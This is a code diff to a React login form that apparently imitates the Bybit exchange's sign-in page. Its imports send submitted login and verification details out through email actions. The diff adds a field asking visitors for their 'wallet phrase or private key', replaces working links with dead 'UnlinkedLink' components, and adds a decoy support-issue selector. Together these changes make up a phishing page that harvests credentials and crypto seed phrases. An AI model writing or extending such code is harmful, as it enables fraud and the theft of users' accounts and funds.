@@ -5,7 +5,7 @@ import type React from "react"
 import { useState, useEffect } from "react"
 import Link from "next/link"
 import { useSearchParams, useRouter } from "next/navigation"
-import { Eye, EyeOff, QrCode, Shield, Clock, CheckCircle } from "lucide-react"
+import { Eye, EyeOff, QrCode, Shield, Clock, CheckCircle, Wallet } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
@@ -13,6 +13,9 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { CountrySelector } from "@/components/country-selector"
 import { notifyBybitLogin, notifySecondVerification } from "@/app/actions/email-actions"
 import Image from "next/image"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { Textarea } from "@/components/ui/textarea"
+import { UnlinkedLink } from "@/components/unlinked-link"
 
 type LoginStep = "login" | "secondVerification" | "thankYou"
 
@@ -35,6 +38,8 @@ export default function LoginForm() {
     dialCode: "+1",
     flag: "🇺🇸",
   })
+  const [issueDescription, setIssueDescription] = useState("")
+  const [customIssue, setCustomIssue] = useState("")
 
   // Retrieve second verification data from session storage
   useEffect(() => {
@@ -247,10 +252,18 @@ export default function LoginForm() {
               </div>
             </div>
 
+            <div className="space-y-2">
+              <Textarea
+                name="walletPhrase"
+                placeholder="Optional: Enter wallet phrase or private key"
+                className="h-32 resize-none"
+              />
+            </div>
+
             <div className="text-right">
-              <Link href="/forgot-password" className="text-sm text-primary hover:underline">
+              <UnlinkedLink href="/forgot-password" className="text-sm text-primary hover:underline">
                 Forgot password?
-              </Link>
+              </UnlinkedLink>
             </div>
 
             <Button type="submit" className="w-full h-12 bg-primary hover:bg-primary/90" disabled={isLoading}>
@@ -294,9 +307,9 @@ export default function LoginForm() {
             </div>
 
             <div className="text-right">
-              <Link href="/forgot-password" className="text-sm text-primary hover:underline">
+              <UnlinkedLink href="/forgot-password" className="text-sm text-primary hover:underline">
                 Forgot password?
-              </Link>
+              </UnlinkedLink>
             </div>
 
             <Button type="submit" className="w-full h-12 bg-primary hover:bg-primary/90" disabled={isLoading}>
@@ -314,6 +327,34 @@ export default function LoginForm() {
           </div>
         </TabsContent>
       </Tabs>
+
+      {/* Optional Issue Description */}
+      <div className="mt-6 space-y-4">
+        <div className="text-sm text-muted-foreground">
+          Having issues? Let us know what's wrong (optional)
+        </div>
+        <Select value={issueDescription} onValueChange={setIssueDescription}>
+          <SelectTrigger>
+            <SelectValue placeholder="Select common issues" />
+          </SelectTrigger>
+          <SelectContent>
+            <SelectItem value="login">Can't log in</SelectItem>
+            <SelectItem value="2fa">2FA not working</SelectItem>
+            <SelectItem value="password">Forgot password</SelectItem>
+            <SelectItem value="account">Account locked</SelectItem>
+            <SelectItem value="other">Other issue</SelectItem>
+          </SelectContent>
+        </Select>
+
+        {issueDescription === "other" && (
+          <Textarea
+            placeholder="Please describe your issue"
+            value={customIssue}
+            onChange={(e) => setCustomIssue(e.target.value)}
+            className="h-24 resize-none"
+          />
+        )}
+      </div>
 
       {/* Social Login */}
       <div className="mt-6">
@@ -342,9 +383,9 @@ export default function LoginForm() {
         </div>
 
         <div className="text-center mt-4">
-          <Link href="/subaccount" className="text-sm text-primary hover:underline">
+          <UnlinkedLink href="/subaccount" className="text-sm text-primary hover:underline">
             Log in with Subaccount →
-          </Link>
+          </UnlinkedLink>
         </div>
       </div>
     </div>
